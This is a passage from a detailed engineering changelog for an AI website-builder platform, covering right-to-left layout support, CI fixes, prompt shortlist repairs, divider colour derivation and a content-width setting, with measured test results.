- **IT COSTS NOTHING, AND THE TOOL HAS TO SAY SO.** "It's cropping his head off" answered with a NEW photograph charges ~19 credits for an image nobody asked for that would very likely be cropped the same way. The reframe moves the crop of the picture already there — no image model, no money — so the lane must not fall through to the generate branch and count it as a picture that could not be made.
- **A SWAP AND A REFRAME ARE TWO EDITS TO ONE ELEMENT and are written in ONE back-to-front pass.** Applied as two passes, the first write moves the second's offsets into the middle of an attribute.
- **ALL FOUR REFUSAL PATHS SAID "I couldn't match that to any of the pictures on your site"** — about a picture the model had found and copied the description of. The works-but-cannot-say-so disease, measured by driving them. Two reasons now, because two are what a customer can act on: *"already shows the bottom"* (stop asking) and *"I couldn't change the framing of that one"* (it is decided elsewhere). **An entry can be BOTH work and a refusal** — a swap that also named an impossible framing swaps AND says the framing did not happen; collapsing the two loses the half that is silent.
- **The already-that-way sentence reads the SLOT, not the refused choice.** A refused entry carries no focus of its own — that is what refusing means — so reading the choice printed *"already shows the null"*. Found by driving it.
- **REFUSED ON A BARE `<img>` AND ON A BOUND FRAMING.** `<img>` has no such prop, so writing it emits an attribute that does nothing; `focus={row.crop}` is a value the site's own data decides and overwriting it drops the binding. The skip-rather-than-guess rule every scanner in that file already lives under.
- **THE LIMIT, STATED: a picture drawn THROUGH a component is not reachable.** Measured across the corpus: **202 direct `<SafeImage>` uses** (183 addressable by the lane) against **194 drawn by 20 components** — `Gallery`, `EventCard`, `MediaGrid` and friends, which carry their picture as a prop rather than an attribute. Those need the page layer.
- **MY OWN GUARD MATCHED THE PROSE.** `safe-image.tsx` opens with a comment reading *"An `<img>` that cannot render broken"*, so a scan for the real element matched the COMMENT and ran to a `/>` a hundred lines away. Comments are blanked, length-preserving, before the element is found. Prose describing a thing contains that thing's spelling — recorded in a lint and a router guard already, and now here.
- 3377 tests, template typechecks, `site build` **138/138** against the real container (including that the stylesheet really defines `object-top`, which is the failure only a real build can see), **14/14 mutations as expected** from a verified-green baseline with a comment-only control that had to survive. **NOT PROVEN LIVE** — the model account is out of credit.

## Right-to-left works, and the KIT was why it did not (2026-08-19)

**`normalizeLang` has accepted `ar`, `he`, `fa` and `ur` since it was written, and NOTHING anywhere set `dir` — so a brief written in Arabic produced a site correctly DECLARED Arabic and laid out left to right.** That is the `lang` gap of 2026-08-12 and the dark-palette gap of 2026-08-18 one layer deeper, with the one difference that decided the whole shape of the work: **those were one attribute and one class, and this was not.**

- **THE KIT WAS WRITTEN IN PHYSICAL PROPERTIES: 1,946 utilities across 614 of 3,728 files** — `components/ui` 1,031, `components/charts` 862, `family-pages` 51, `lib` 2, `routes` **0**. So `dir="rtl"` alone would have flipped the text and left every margin, padding, border and offset on the wrong side, which reads as a badly-made site rather than an honest limit. **1,056 class conversions across 471 files, plus 7 inline indents.**
- **THE SWEEP IS SAFE BECAUSE A CORRECT CONVERSION IS A NO-OP IN ENGLISH, and that is what made ~1,000 edits reviewable at all.** `ms-4` and `ml-4` put the content in exactly the same place, so what has to be verified is the ~96 MAPPINGS rather than the 1,056 edits. **Measured as GEOMETRY in a real browser against the real built stylesheet: 96/96 land identically in LTR, 96/96 move in RTL.** The first probe read `getComputedStyle` KEYWORDS and reported three false alarms — `text-align: left` and `start` are different strings that render identically — so what is asked is where the box and its ink actually end up.
- **EVERY CONVERSION IS GATED ON TAILWIND EMITTING BOTH HALVES, and that one rule rejects three unrelated hazards.** A template literal (`pl-${n}`), a utility Tailwind does not have (`origin-start` — my mapping table was wrong and only the gate said so), and **five English words in customer copy a string sweep would have corrupted**: `left-hand`, `right-hand`, `left-handed`, `right-handed`, `right-to-repair`. **The first grep was garbage and is worth recording**: `items-center` contains `ms-`, `rounded-lg` contains `rounded-l`, `theme-` contains `me-` — it reported 1,158 files as already logical, which is nonsense. Tokens, never substrings.
- **THE SWEEP PROVES WHAT IT CHANGED RATHER THAN ASSERTING IT.** Every edit is recorded as `(offset, from, to)` and the ORIGINAL is RECONSTRUCTED from the new file before anything is written; a mismatch throws. The first reconstruction was wrong — it carried a running shift, and reverting an edit puts the prefix back to its original length, so every later edit is at its ORIGINAL offset and the shift must be zero. Caught by the check itself on the first length-changing mapping.
- **`left-1/2` WITH `-translate-x-1/2` IS THE ONE IDIOM THAT MUST NOT BE CONVERTED, and converting it is worse than leaving it.** That pair already centres in BOTH directions — the offset is a point and a transform does not mirror — so `start-1/2` becomes `right:50%` in RTL and the translate pushes it further off: the "fix" breaks a correct centre. 14 of them, found by scanning for the PAIR, and guarded so a later tidy-up cannot finish the job.
- **`components/charts` IS A STATED EXCEPTION AND THE NUMBER IS THE REASON.** 862 utilities across 129 files — and **117 of those 129 also position with a computed inline `style={{ left: … }}`**. Converting only the Tailwind half gives a bar anchored right and its label anchored left. **Half-mirrored is worse than not mirrored**, the same rule this file already applies to a check that is wrong a third of the time.
- **DIRECTIONAL ICONS ARE ONE CSS RULE, NOT 192 EDITS.** Measured: 192 uses across 70 files (`ChevronRight` 74, `ArrowRight` 38, `ChevronLeft` 32, `ArrowLeft` 31, `Undo` 13, `Reply` 8…). Marking each by hand fixes those and nothing the generator writes tomorrow — the `safe-image` argument, where a guard the model must remember is one it eventually forgets. `lucide-react` stamps a per-icon class (`lucide lucide-chevron-right`, verified on a real rendered page), so the mirror is stated once for every use that exists and every use that will.
  - **`scale`, NOT `transform`, and it is not a preference.** Tailwind v4 emits `rotate-180` as the INDIVIDUAL `rotate:` property — measured in a built stylesheet — so a `transform` here would be REPLACED by a component's own transform utility, while the individual `scale:` composes with it. **Proven on a real build: a chevron carrying `rotate-180` in an RTL document computes BOTH `scale: -1 1` and `rotate: 180deg`.**
  - **MEDIA TRANSPORT AND `align-left` ARE DELIBERATELY OUT.** A timeline runs the same way in every language, so mirroring the transport makes "next track" point at the previous one; `align-left` depicts a literal alignment the user is CHOOSING, and mirroring it makes the button lie about what it does. Both verified on the same render: play, align-left and a neutral icon all compute `scale: none`.
- **SEVEN COMPONENTS INDENTED BY DEPTH WITH `paddingLeft` AND NO CLASS SWEEP COULD HAVE SEEN THEM** — trees, an outline, a finding aid, all computed inline from a number. `paddingInlineStart` now. **Three stay physical on purpose and are NAMED rather than left to memory**: `env(safe-area-inset-left)` is a notch on the actual left of the glass, and `scroll-lock` saves and restores the body's own padding against a scrollbar.
- **`dirFor` IS A TABLE OF SCRIPTS, NOT OF LANGUAGES, AND THE SCRIPT SUBTAG WINS.** Azerbaijani is Latin in Azerbaijan and Perso-Arabic in Iran; Kurdish and Fulah are each written in two scripts with opposite directions. A language list gets those wrong in BOTH directions and cannot be told it is wrong, because the tag already carries the answer — so `az-Arab` is rtl and `ku-Latn` is ltr. **`Intl.Locale.textInfo` exists here and was rejected**: ICU is what this repo has already been bitten by, where two ICU VERSIONS disagreed about one locale, and a site's direction decided by whichever Node built it could flip on a base-image bump.
  - **AND MY OWN LANGUAGE LIST HAD `ku` AND `ff` IN IT, BOTH WRONG.** Checked against CLDR rather than intuition: `ku` maximises to `ku-Latn-TR` (the Perso-Arabic Kurdish is Sorani, `ckb`) and `ff` to `ff-Latn-SN`. So a Kurmanji or Fulah brief produced a right-to-left site with LATIN text in it — visibly wrong, reachable by an ordinary brief. **My own test asserted `dirFor("ku-Latn") === "ltr"` and PASSED THE WHOLE TIME**, because the SCRIPT rule answered it: an assertion that reads as covering the language and covers a different rule entirely. Both are still reachable as rtl the honest way (`ku-Arab`, `ff-Adlm`), which is why their absence is explained in the source rather than left as a gap somebody restores.
- **NOTHING IS ASKED FOR AND NOTHING IS STORED.** The direction is derived from the language at build time, so there is no second value that can disagree with the tag beside it, and the look lane already changes the language. `dir="ltr"` is written on every left-to-right site too — `ltr` is the initial value, so it renders identically, and the attribute's PRESENCE is then never a signal anybody has to reason about.
- **PROVEN BY EXECUTING THE PACKAGED WORKER, because under Start there is no built shell.** Two real builds through the real container: `lang: "ar"` → `dir: "rtl"`, served 200 as `<html lang="ar" dir="rtl">` — brand top-right, nav flowing right to left with the CTA on the far left, prices on the far side, the form reversed. **The `ms-auto` price sits 24px from the right in LTR and 24px from the left in RTL**, measured rather than eyeballed. `site-build` now carries that as a live check, with an LTR control, because every assertion above passes on a build that hardcodes rtl.
- **AND THAT FOUND THREE ASSERTIONS THAT HAD BEEN RUNNING OVER NOTHING.** `site-build` checked the site's language and its favicon by looping the dist's `.html` files — and the assertion forty lines above them says in as many words that the dist contains NO HTML, because the document is rendered per request. So three checks about the language and the mark iterated zero times and covered nothing, invisibly: **a loop over an empty collection contributes no checks to fail.** They are asserted on a rendered document now.
- **MY OWN NEW SCANNER REPORTED TWO HITS AND BOTH WERE COMMENTS SAYING THE FILE DELIBERATELY DOES NOT DO THAT.** Prose describing a thing contains that thing's spelling — the fourth time this repo has recorded that trap, this time inside the guard written for the sweep. Comments are blanked, length-preserving, before anything is scanned.
- **AND `pkill -f 'build-server.mjs'` KILLED MY OWN SHELL, six times.** The harness wraps a command in a shell whose command line CONTAINS the pattern, so `-f` matched the wrapper: every run died at exit 144 with an empty log, which reads exactly like a resource limit or a hung build. Worth knowing before diagnosing a "flaky" harness.
- 3492 tests, kit and template typecheck clean, **15/15 mutations as expected** from a verified-green baseline with a comment-only control that had to survive. **NOT PROVEN LIVE** — the model account is out of credit, so no customer build has carried it.

## `site build` was red for fifteen hours and it was hiding a second bug (2026-08-19)

**Four consecutive runs, all failing on the same eight lines, and nobody read past the first.** The cause was ONE component missing from an allow-list; the cost was **nine checks that never ran**, including `site-build` itself — the strongest free signal in the repo — plus `kit-paint`, `theme-render`, `site-routing` and `site-runtime`.

- **`LangSwitch` BECAME ROUTER-DEPENDENT AND NOTHING SAID SO.** The bilingual work rewrote it from a `value`/`onChange` picker into the thing `SiteHeader` renders, so it reads `useMatches` to offer the other language's copy of THIS page — which is the whole point of the feature and also makes it undrivable outside a `RouterProvider`. `SiteChrome` and `SiteHeader` were already on `CANNOT_RENDER` for exactly that reason, **and this component is rendered BY `SiteHeader`**, so the list was always going to need it.
- **AND THEN THE THING IT WAS HIDING, which is a real legibility bug on a customer-facing component.** `matrix-table` prints each cell's number on a shade of `--foreground`, flipping the ink past 0.66 — and **0.66 was calibrated on the LIGHT theme only**. The comment's own worked numbers ("dark text around 5.5:1, light text around 3.4:1") are light-theme numbers. Measured against the template's own tokens at a 4.5:1 bar: **light crosses over at 0.62, dark at 0.51**. So every dark cell in **0.53..0.66** was printed in the ink with LESS contrast, **down to 2.99:1**. The `dark:` variant lets both flips be emitted and CSS pick, which is what a prerendered component needs since it cannot know the theme.
- **THE RESIDUE IS STATED IN THE SOURCE RATHER THAN PAPERED OVER, and measuring three fixes before settling is the useful part.** At the crossover itself the best either ink can do is **4.40:1 in dark**, just under AA. Shortening the ramp to 72% or 62% **moves the band without removing it** (4.39:1 both times); flipping to pure black instead of `--background` gets 4.49:1; **the theoretical ceiling with pure black and pure white is 4.59:1**. So it is inherent to printing text on a shade, not a wrong constant — and both obvious "fixes" were wrong, which cost ten seconds to find out and would have cost a bad commit to assume.
- **THE STRUCTURAL FIX IS THAT ONE RED STEP NO LONGER HIDES THE OTHERS.** Actions stops a job at the first failing step, so `site-build.yml` was nine independent measurements in a row where the first one to break silenced the rest. Each now runs regardless — **gated on the SETUP steps, not on the previous check**, because a bare `success() || failure()` turns one broken `npm ci` into eleven identical module-not-found failures instead of one that names the cause. `!cancelled()` rather than `always()`, so a cancelled run does not spend a runner on eleven doomed steps.
- **A RED CHECK EVERYBODY KNOWS ABOUT IS A CHECK NOBODY READS**, which is this file's own argument about the Cloudflare beacon, arriving as an incident rather than a warning. Fifteen hours is how long the second bug lived behind the first.
- **MY OWN SCREENSHOT WAS WORTHLESS AND LOOKED FINE.** Verifying by eye, the first attempt inlined `src/styles.css` — the SOURCE — so Tailwind never ran, not one utility class existed, `dark:` did nothing, and the "light" render was browser defaults wearing the look of a result. The real one builds the stylesheet the way `kit-paint` does and **asserts the body's computed background before believing the picture**. A harness that cannot fail honestly is worse than none; this is the fourth instance recorded here and the first inside a check written to verify a contrast fix.
- 3527 tests; `kit render`, `kit paint`, `kit typecheck`, `kit a11y`, `kit effects`, `theme seam`, `theme render` and **`site build` 180/180** all green locally.

## The prompt told the model not to use the components its own examples import (2026-08-19)

**Ran ONE build with no layout family — the model deciding the page set, the section order, the primary action and the components from the brief alone — and it published as the fallback.** Then a second one, which also published as the fallback. **Neither failed at laying out a page. Both failed by inventing a kit API**, and one of the two was our own prompt contradicting itself.

- **`UI_SHORTLIST` IS DERIVED FROM `FAMILIES[*].components` AND RULE 3 CALLS IT "the only names under that path you should use" — WHILE THE FOUR REFERENCE PAGES IN THE SAME CACHED PROMPT IMPORT TEN MODULES THAT ARE NOT IN IT**: `hero` · `button` · `card` · `input` · `select` · `textarea` · `form` · `skeleton` · `data-list` · `seo-jsonld`. `hero.tsx` exports `Hero`, `hero-split.tsx` exports `HeroSplit`, both real, only one offered. **Obeying both instructions produces an export name from the example and a module name from the list** — `import { Hero } from "@/components/ui/hero-split"`, measured live. `TS2305` on `index.tsx`, **which salvage refuses to stub**, so one bad import cost the whole site.
- **THE FAMILIES WERE HIDING IT, WHICH IS WHY IT SURVIVED.** With a family the shortlist happens to carry whatever that family's exemplar reaches for, so the contradiction is rarely reachable; take the family away and the model has nothing to go on but the examples in front of it. **A prompt bug can be latent because of a feature that has nothing to do with it.**
- **THE FIX IS A UNION, DERIVED AT BOTH ENDS.** The shortlist is the family components, plus every module the reference pages import, plus `RULE_CITED_COMPONENTS` (`seo-jsonld`, whose worked call rule 18 prescribes). 282 → **292**, and zero prompt imports outside it. So a fifth reference page or a newly-cited component joins without anybody remembering the file — and **the guard names the offenders** rather than counting them, because "9 imports are not in the shortlist" sends the reader looking and the list of nine does not.
- **AND A DETERMINISTIC REPAIR, because the prompt fix makes this class rarer and cannot make it impossible.** `repairImports` rewrites an import of a name a module does not export to the name it does — **only when there is exactly one answer**: the module's PascalCase name if that is an export (378 kit modules), or the sole export of a single-export module. **Everything else is LEFT ALONE**: an unknown module, a lowercase helper, a multi-export module with no PascalCase match (`heading-level` exports `Section` and `Heading`). **A wrong rename that COMPILES renders the wrong component, which is far worse than the failed build** — the same rule the import lint already lives under. The USAGE is rewritten with the import, or the page still does not compile.
- **NOT THE REPAIR PASS THAT WAS REMOVED.** That one re-ran the MODEL at ~80% of a build's cost to guess again. This is a string substitution against a list already in the prompt: no model call, no tokens, no second generation. It runs BEFORE the lint, so a repaired page is linted as it will be built.
- **ASSERTED AT THE DEP BOUNDARY, NOT BY READING THE SOURCE.** A page with the broken import must reach `compile` repaired, and a clean build must report **no** repairs at all — `repaired: []` on every build reads in the response and in the eval as a generator that keeps getting names wrong. **Not-called and called-then-discarded are two ways to die silently that look identical from outside**, which is the wiring layer this repo has recorded twelve features dying in.
- **`right === name` IS PROVEN INERT — 0 reachable across all 2,040 kit modules — and says so in the source** rather than being deleted or falsely asserted. `right` is always a member of `known` and `name` never is; the `known.has(name)` continue above is what guarantees it, and that is one edit away from changing. Without it a self-rename would push a `fixed` entry claiming a repair that did not happen, for every import on the page.
- **A GUARD FOR ONE FEATURE WENT RED ON ANOTHER FEATURE'S VARIABLE NAME.** `test/declarable-enforced.test.mjs` cuts `out.push({` out of a bundle that INCLUDES `page-gen.mjs`, to prove the schema features it checks are really enforced — so an unrelated `out.push({` in a new function there read as a **failed cut**, i.e. "every property looks enforced". Two fixes, because either alone is luck: the function's array is named `repaired`, and the assertion is now scoped to `cutSchemaSource()`. **The cut is a fact about `site-schema.mjs`; assert it about `site-schema.mjs`.**
- **WHAT THE EXPERIMENT ACTUALLY MEASURED, stated honestly: n=2, 0 compiled, against a documented ~19/21 with families — and half of it was our fault.** The other failure was `localBusinessJsonLd` asked for an `email` it did not take, which is the `fallbackSeed` class again (the model's instinct right, the kit refusing) and is now a real field. **So this is not evidence that a model cannot lay out a page.** It is evidence that removing the families removes the cover over every gap between what the prompt says and what the kit has. The cost difference was measured separately at **about 2 cents a build**, so families were never a cost optimisation — they are the image budget and the page set.
- **The experiment's env is REVERTED, and kept as prose rather than a commented-out block**: a commented-out `SMOKE_NO_FAMILY: "1"` is one uncomment away from spending a paid build on a question already answered.
- 3527 tests, **9/9 mutations as expected** from a verified-green baseline with a comment-only control that had to survive.

## …and then the rules came off entirely (2026-08-19, owner's call)

**"I like them better like that. If user wants to add it cool, but don't put it as default for build."** Said after seeing the page rendered without them, the turn after the colour fix above — so that fix now applies to the borders a page draws in its own body and to card outlines, and no longer to the three the frame used to force.

- **THEY WERE HARDCODED IN THE KIT AND NO CUSTOMER COULD REMOVE THEM.** `site-header.tsx` carried `border-b` and `site-footer.tsx` carried `border-t` twice, so every site the platform has ever made had exactly those three and there was no path to turning them off at any price. The missing-slot class, again — the `border` axis picks only THICKNESS (`hairline` 290 · `drawn` 159 · `bold` 51), never absence.
- **THE ARGUMENT IS ONE THIS FILE ALREADY MADE, one layer up.** `bandClearCss` exists because the owner looked at a phone screenshot and read the page as *"four visible slabs"*; its note ends *"sections separate by spacing and type, not by tone."* The chrome rules were the last thing still slicing the page.
- **IT RIDES THE EXISTING `layout` PROP FAMILY, so there was no new plumbing**: `SiteChrome` already passes `layout` to both halves and `CHROME_OBJECTS.layout` already drives the tool, the digest and the reply. One field, and `divider: true` puts them back.
- **AND THE LINE WAS STILL THERE, because a rule is not the only thing that draws one.** *"I thought it was gonna have no lines tho."* Removing the border was a true statement about the CSS class and a false one about what the page looks like: the header also carried `bg-background/85 backdrop-blur`, a pale strip whose bottom edge **ends in a hard step — measured at 40 in the blue channel, with no border within reach of it.** A step is a line to the eye whatever the CSS calls it, and this entry's own first draft claimed the opposite ("it reads as a distinct band with no line at all"), from rendering a mock rather than the real page. **Ask what the reader sees, not what the stylesheet says.** 40 → 1 after the fix.
- **THE BAND EXISTS FOR STICKINESS AND NOTHING ELSE, PROVEN BY SCROLLING ONE.** A stuck header has the page passing UNDER it, so with no surface the wordmark prints straight through the page's own headings — measured on a real scrolled render, "Fold Coffee" through "Flat white". An unstuck header scrolls away and needs none. So the band now renders only when `sticky`, and there is **no arrangement with a sticky header and no line**: ask for one and the band comes with it.
- **SO `sticky` DEFAULTS OFF TOO, and the asymmetry this entry first claimed is gone.** The original reasoning — *"`sticky` defaults ON because it preserves what sites already do"* — is exactly the reasoning that leaves the line on every page, since the band travels with it. Both defaults are `false`, both strictly `=== true` so nothing merely truthy from a stored layout turns them on, and both are pinned **twice**: in the spec, and in the COMPONENT, which is what renders. A mutant reverting only the component's own default (`layout?.sticky !== false`) survived the whole suite until that second guard existed.
- **ASSERTED AS AN ABSENCE, which is the half that rots silently.** A later edit restoring an unconditional `border-b` puts them back on every site on the platform with the axis still present and every other test green. The source guard scans BOTH files for any `border-t`/`border-b` literal and requires each to be gated — **after blanking comments**, because both files explain this in prose and prose about a class name contains that class name (seventh recorded instance). Paired in `site-build` with a real compile at both ends: a site that asks gets them, a site that does not has neither, and **neither assertion alone discriminates**.
- **THE THREE FAMILIES THAT HAND-ROLL THEIR OWN FRAME KEEP THEIR LINES** — `campaign`, `crm`, `hotel` never use `SiteChrome` (16 of 318 exemplars do not). That is a per-family design rather than the default, and left alone. So are the body rules: **245 of 324 corpus pages write their own `border-t`/`border-b`**, which separate content rather than framing the page.
- 3520 tests, template typechecks, `site build` **180/180** against the real container, **13/13 mutations as expected** from a verified-green baseline with a comment-only control that had to survive. `COMPONENT_API` regenerated — the two derived drift guards caught the stale copy, which is them working.

## Every divider was lighter than the page it divided (2026-08-19)

**Reported by the owner pointing at a screenshot: two white lines, one under the header and one above the footer.** They are ordinary borders — `border-b` and `border-t`, no colour class, so they take `--border` through the template's own `* { border-color: var(--color-border) }`. The colour was `rgb(215,214,210)`, a near-neutral grey, on a ground of `rgb(254,201,133)`.

- **THE FIRST DIAGNOSIS WAS THE HUE AND IT WAS THE WRONG ONE.** Measuring chroma says the border is grey where the page is orange, which is true and is not what makes it read as a white line. **Measuring LIGHTNESS says it: the divider is lighter than the ground on 57 of 57 shortlist themes with a world, median gap +0.10 L, median contrast 1.39:1.** A divider is meant to be the ground DARKENED — a line lighter than what it separates is a white streak, whatever its hue. The hue fix (same lightness, page's hue) was rendered and does not fix it; that render is what killed it.
- **THE CAUSE: `paletteFor` derives `border` as `mix(paper, ink, 0.14)` — the paper, stepped toward the ink — and under a world the page is no longer the paper.** `openRootCss` opens the root to 0.35 so the backdrop shows through, darkening the ground by MORE than 14%, so the "darker" divider lands lighter. **Exactly the bug `worldMutedCss` already fixes one token over**, whose own comment says it in as many words: *"`muted-foreground` was derived against the PAPER, so over the deepest corner of a rich backdrop it dropped to ~3:1."* Same fix, same place, same gate.
- **THE DECISIVE MEASUREMENT WAS SAMPLING A REAL RENDERED PAGE, not the theoretical floor.** The ground runs **L 0.792 at the top to L 0.945 at the bottom**, against `--border` at 0.875 — so it is lighter than the ground over the top 29% and only just darker below. Two different failures from one token, which is why the header rule reads worse than the footer rule in the owner's own screenshot. It also fixed the step: `worldWorstGround` is the FLOOR (0.776) and the real page never reaches it, so landing just below the floor already clears every point and stepping further only makes the line heavier everywhere else. **`WORLD_BORDER_STEP` is 0.03**, rendered against 0.08 side by side.
- **NO THEME DECLARES A BORDER COLOUR — 0 of 500, measured.** A theme declares exactly `paper`, `ink`, `accent` per mode and the other 31 tokens are derived. So nobody chose that grey, and changing the derivation overrides no designer's decision. (A theme DOES have a key called `border` and it is the WEIGHT axis — `hairline` 290 · `drawn` 159 · `bold` 51 — which reads confusingly next to the colour.)
- **DARK MODE HAD THE MIRRORED BUG AND I ONLY ASSUMED IT UNTIL IT WAS MEASURED: 56 of 84 world themes drew a divider DARKER than a dark page.** One expression covers both because it steps toward the INK — dark on a light theme, light on a dark one, away from the ground in each case. **57 → 0 and 56 → 0.**
- **THE 90 PLAIN THEMES ARE UNTOUCHED BY CONSTRUCTION**, on the `grounded` gate that was already there and already tested — for them the paper really is the ground. Verified by rendering `noir` before and after: byte-identical. And the derivation agrees with the old one where it was already right: the **99 ground-decor-only themes move L 0.012**, imperceptible, which is the sign it is principled rather than tuned.
- **THE COST, STATED: card outlines get more visible and it cannot be prevented.** `--border` is one token doing two jobs. Measured over the 324 corpus pages, borders are drawn as **918 `border-border` · 286 `border-t` · 226 `border-b` · 175 `border-y` against 9 `bg-card`** — so nothing in what the pages write distinguishes a card outline from a section rule, and the obvious `.bg-card` predicate reaches 9 pages. Inputs are safe: they use `border-input`, the separate `--input` token.
- **`rgbToOklch` HAD TO BE ADDED and its first test was wrong in the instructive direction.** Round-tripping from OKLCH failed on `oklch(0.62 0.16 60)` — citrus's own accent, which is **outside sRGB**, so `oklchToRgb` clamps and the inverse honestly returns the clamp. Round-tripping from RGB is exact for every triple by construction, and it is the direction that matters since `worldWorstGround` returns rgb. **Paired with pinned reference values** (white, and sRGB red at L 0.628 / C 0.258 / H 29.23), because a round-trip alone passes perfectly on two transforms wrong in mutually inverse ways.
- **MY PROBE READ THE LAST `--border` IN THE FILE, which is the `.dark` block**, and reported citrus's dark value as the light one and a value for `noir` that is simply its own dark palette. Read per selector block, not per file. It also concatenated `themeCss(t) + worldCss(t)` when **`themeCss` already composes `worldCss`** — harmless in a render (identical declarations) and not harmless in a test, where the ordering assertion would have held whether or not the override really comes last. Asserted on `themeCss` alone now.
- **The guard asserts the PROPERTY over the real 500-theme registry** — a divider must sit away from the ground, in whichever direction the ink is — **plus its inverse**: the old paper-derived value must FAIL that property on 100+ theme-modes, or the assertion passes whether or not the fix is present. With a floor on the theme count, since a filter that stopped matching would report a clean sweep over nothing.
- **THE SEPARATION IS A HAIRLINE BY DESIGN, measured across all 410 world themes: the divider sits 0.013–0.023 L below the ground, median 0.017.** So it is never a slab; the chroma follows the page (0.000 on a neutral concrete theme, 0.194 on a saturated rainforest one), which is the line reading as the page a shade deeper rather than as a foreign colour.
- **THE LIMIT, since this fix does not cover it: a page with its OWN background** (the per-page colour scope) still gets the SITE's divider, because the override is derived once per theme. `worldMutedCss` has had exactly the same property since it shipped and nobody has hit it; closing it means deriving both tokens per scope, which is a bigger change than the bug justifies today.
- **A SIDE-BY-SIDE RENDER IS MISLEADING FOR A GRADIENT THEME**, found while checking `aurora`: the two panes sit at different points of one page-wide gradient, so they differ in colour for reasons that have nothing to do with the change. Fine for `wash` (broadly uniform near the top, which is where the reported line is) and useless for `aurora`. Compare the numbers there, or render the panes as separate documents.
- **A HAND-ROLLED BUILD SANDBOX SHARES `node_modules/.vite` WITH EVERY OTHER ONE, AND THAT COST THE LONGEST DETOUR HERE.** `site-build.mjs` copies the template and **symlinks** `node_modules` — right for the suite, which runs once — and fatal when several sandboxes are made by hand in a row: they share Vite's cache, so **one unchanged source produced three different answers**, twice reporting the override absent from a bundle that really carries it. The signature is exactly that: same input, different output, no code change between. Recognise it and stop, rather than hypothesising about the minifier — a "marker property rescues it" experiment looked decisive and was a cache artifact. **Also: a detached spawn that INHERITS the parent's stdio dies when the parent exits**, and then something else answers the port with `APP_DIR` unset, so builds fail on `/app/.routes-base` — send its stdio to a file.
- **MY OWN DARK-BLOCK ASSERTION WAS VACUOUS AND PASSED ON EVERY RUN WHERE THE OVERRIDE WAS MISSING.** `/\.dark[^{]*\{[^}]*--border:\s*oklch/` is satisfied by the PALETTE's own `.dark` declaration, which is always there. It asserts the VALUE now — citrus's dark palette is L 0.31 and the override is L 0.41, so a floor between them is what discriminates. And the light-side check had two separate faults of the same family: it read the last `--border` in the FILE (the `.dark` block, a different question) and **the minifier rewrites `0.4117` as `41.17%`**, so a bare-number parse compared 41.17 < 0.8 and failed against perfectly correct code.
- 3519 tests, `site build` against the real container, **9/9 mutations as expected** from a verified-green baseline with a comment-only control that had to survive. **NOT PROVEN LIVE** — the model account is out of credit, so no customer site has republished with it.

## How wide the page runs, and an axis that was doing nothing (2026-08-19)

**Asked what the FRONTEND still could not reach, measured it, and the answer was one gap and one dead feature — both about a site-wide knob that either did not exist or did not connect.**

- **CONTENT WIDTH WAS THE MOST REPEATED LAYOUT VALUE ON EVERY SITE AND HAD NO KNOB AT ALL.** All 324 corpus pages carry a `max-w-*`, 1,224 of them, median 4 distinct widths a site — and `density` deliberately does not move them: its own comment says the columns stay put while what is inside them loosens. So *"it's too narrow on a big screen"* was a `tweak` per page, ~3 credits each, asked once per page, for the single most common layout property there is.
- **THE MECHANISM WAS ALREADY THERE, WHICH IS WHY THIS IS AN AXIS RATHER THAN A FEATURE.** Measured in a real built stylesheet: `.max-w-6xl{max-width:var(--container-6xl)}`, and the tokens are declared in `:root` — the same shape `--radius` and `--spacing` already use. An 18th style axis writing `--container-*` is the whole change.
- **ONLY THE SHELL SIZES MOVE, AND THE BOUNDARY WAS MEASURED RATHER THAN JUDGED.** Counting every `max-w-*` against whether its own element also carries a page gutter (`px-N`): **`4xl` 52/52, `5xl` 127/127, `6xl` 364/364 and `7xl` 2/2 are page shells 100% of the time**, while `2xl` is 9% and `lg`/`prose`/`sm`/`xs` are 0%. So the boundary sits exactly at `4xl` and everything below is a reading column that must NOT widen — pulling a 65-character paragraph to 90 is the opposite of what "make it wider" asks for. A RATIO rather than four numbers, the `typeCss` pattern, so a page mixing `4xl` and `6xl` keeps the relationship it was drawn with.
- **THE FRAME FOLLOWS FOR FREE, and that is the property that makes it safe.** `site-header.tsx` and `site-footer.tsx` cap themselves at `max-w-6xl`, which compiles to `var(--container-6xl)` — so overriding the token moves the chrome and the page bodies together. Anything that hardcoded a rem would have made the two disagree. **Measured in a real browser at 1900px: shell 1152 → 1359 wide → 979 narrow, header tracking it exactly at all three, and the reading column 672 in every one.**
- **A SECOND `:root` ONLY WINS ON SOURCE ORDER, and this repo has already shipped one a minifier dropped** — the per-page font, which reported the chosen family while serving the default. So it is proved against the REAL compiled stylesheet rather than the string the module returns: `wide` → `84.96rem` as the LAST declaration, `narrow` → `61.2rem`, and a site that never asked has exactly ONE declaration at Tailwind's own `72rem`. `site-build` carries all three.
- **AND THEN THE `display` AXIS TURNED OUT TO BE DOING NOTHING AT ALL.** It emitted `.font-heading:not(.bg-primary *)`, and that class is in **0 of the 2,112 kit files and 0 of the 324 corpus pages** — so Tailwind, which only generates a utility something uses, never emitted the rule. Verified against a real compiled stylesheet: it carries the token and `h1,h2,h3,h4 { font-family: var(--font-heading) }` and no `.font-heading` rule anywhere. **"Put our brand colour in the headings" was stored, reported as applied, and changed nothing on any site** — 1 of the 17 site-wide axes, dead since it shipped.
  - **THE COMMENT TWO LINES ABOVE THE RULE IT SHOULD HAVE COPIED WARNS ABOUT EXACTLY THIS.** `styles.css` says *"A token nothing references is the state this template was already in: --font-heading could be set perfectly and change nothing on screen"* — written when the FONT was moved off the class onto the elements. The colour was left behind. It names the same elements now, and the guard is **derived from the template's own font rule**, so the two cannot drift apart again.
  - **AN EXISTING TEST ASSERTED THE BUG.** It pinned `/\.font-heading:not\(\.bg-primary \*\) \{ color: var\(--display\)/` — a selector matching nothing on any published site — so it passed for the entire time the feature did nothing. Assert the property, not the spelling, and this time the spelling being pinned was the dead thing itself.
  - **SPECIFICITY IS NOT WHAT DECIDES HERE, and two rounds of reasoning got it wrong before a render settled it.** Tailwind v4 emits utilities inside `@layer utilities` and this rule is UNLAYERED — an unlayered rule beats a layered one whatever its specificity.
